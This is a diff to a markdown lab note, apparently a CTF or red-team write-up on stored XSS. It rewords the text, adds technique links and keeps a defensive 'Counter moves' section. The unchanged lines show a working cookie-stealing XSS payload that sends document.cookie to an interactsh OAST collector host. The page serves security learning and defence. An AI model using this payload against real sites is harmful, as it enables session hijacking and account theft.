@@ -4,12 +4,18 @@
 
 ----
 
-Using [app.interactsh.com](https://app.interactsh.com), use whatever title, and message (change `src` to whatever OAST app you are using):
+Using [app.interactsh.com](https://app.interactsh.com), any title and message work; swap `src` to whichever OAST app is in use:
 
 ```text
 <script>document.write("<img src='https://cgn1cqt2vtc0000xbc8ggekoscryyyyyb.oast.fun?="+document.cookie+"'></img>");</script>
 ```
 
+## Techniques
+
+- [Cross-site scripting (XSS)](../../techniques/xss.md)
+- [Client-side attacks runbook](../../runbooks/client-side.md)
+
 ## Counter moves
 
-XSS stored 1 is the variant in play. A client-side finding still needs a server-side control behind it. Defenders' notes on this are under [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
+XSS stored 1 is the variant in play. A client-side finding still needs a server-side control behind it. Defenders' 
+notes on this are under [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
